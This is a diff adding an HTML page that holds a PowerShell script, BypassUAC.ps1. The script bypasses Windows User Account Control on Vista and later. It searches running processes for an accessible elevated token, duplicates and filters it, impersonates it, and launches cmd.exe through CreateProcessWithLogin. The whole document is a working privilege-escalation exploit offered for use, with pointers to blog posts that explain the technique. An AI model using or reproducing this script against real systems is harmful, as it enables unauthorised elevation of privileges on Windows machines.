@@ -1,0 +1,60 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>BypassUAC.ps1</title>
+</head><body># Powershell script to bypass UAC on Vista+ assuming<br/>
+# there exists one elevated process on the same desktop.<br/>
+# Technical details in:<br/>
+# https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html<br/>
+# https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html<br/>
+# https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html<br/>
+# You need to Install-Module NtObjectManager for this to run.<br/>
+<br/>
+Import-Module NtObjectManager<br/>
+<br/>
+# Function to find the first accessible elevated token.<br/>
+function Get-ElevatedToken {<br/>
+ Param([switch]$NoFilter)<br/>
+ $token = $null<br/>
+ while ($true) {<br/>
+  Write-Host &quot;Checking for elevated processes&quot;<br/>
+  $token = Use-NtObject($ps = Get-NtProcess) { <br/>
+   foreach($p in $ps) {<br/>
+    try {<br/>
+      $ret = Use-NtObject($token = Get-NtToken -Primary `<br/>
+                    -Process $p -Duplicate `<br/>
+                    -IntegrityLevel Medium) {<br/>
+       if ($token.Elevated) {<br/>
+        Write-Host &quot;Found elevated token in process $p - Pid $($p.ProcessId)&quot;<br/>
+        return $token.Duplicate()<br/>
+       }<br/>
+      }<br/>
+      if ($ret -ne $null) {<br/>
+        return $ret<br/>
+      }<br/>
+    } catch {<br/>
+    }<br/>
+   }<br/>
+  }<br/>
+  if ($token -ne $null) {<br/>
+   break<br/>
+  }<br/>
+  Start-Sleep -Seconds 1<br/>
+ }<br/>
+<br/>
+ if (!$NoFilter) {<br/>
+  # Filter to remove elevated groups/privileges.<br/>
+  $token = Use-NtObject($token) {<br/>
+   Get-NtFilteredToken $token -Flags LuaToken<br/>
+  }<br/>
+ }<br/>
+ return $token<br/>
+}<br/>
+<br/>
+Use-NtObject($lua_token = Get-ElevatedToken) {<br/>
+ Use-NtObject($lua_token.Impersonate()) {<br/>
+ [SandboxAnalysisUtils.Win32Process]::CreateProcessWithLogin(&quot;Badger&quot;, &quot;Badger&quot;, &quot;Badger&quot;, <br/>
+    &quot;NetCredentialsOnly&quot;, &quot;cmd.exe&quot;, &quot;cmd.exe&quot;, 0, &quot;WinSta0\Default&quot;)<br/>
+ }<br/>
+}<br/>
+</body></html>
